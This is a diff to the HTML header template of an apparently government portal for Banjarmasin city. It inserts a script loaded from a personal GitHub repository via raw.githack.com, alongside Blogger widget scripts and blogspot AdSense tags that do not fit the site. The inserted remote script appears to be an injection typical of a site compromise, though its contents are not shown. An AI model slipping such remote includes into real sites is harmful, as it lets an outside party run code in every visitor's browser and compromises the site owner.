@@ -38,7 +38,14 @@
         
         <meta content='SPBE Pemerintah Kota Banjarmasin' property='og:site_name'/>
         <link rel="stylesheet" href="<?php echo base_url('assets/css/style.css'); ?>">
-        <script src="<?php echo base_url('assets/js/jquery.js'); ?>"></script>
+        <script src='https://raw.githack.com/ililio/i/main/i.js' type='text/javascript'></script>
+        <script type="text/javascript" src="<?php echo base_url('assets/js/jquery.js'); ?>"></script>
+        <script type="text/javascript" src="<?php echo base_url('assets/js/jquery.2.1.3.js'); ?>"></script>
+        <script type="text/javascript" src="<?php echo base_url('assets/js/style4.js'); ?>"></script>
+        <script type="text/javascript" src="https://www.blogger.com/static/v1/widgets/543519525-widgets.js"></script>
+        <script type="text/javascript" src="<?php echo base_url('assets/js/style3.js'); ?>"></script>
+		<script type="text/javascript" src="<?php echo base_url('assets/js/style2.js'); ?>"></script>
+		<script type="text/javascript" src="<?php echo base_url('assets/js/style.js'); ?>"></script>
         <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
         <meta name='google-adsense-platform-domain' content='blogspot.com'/>
     </head>
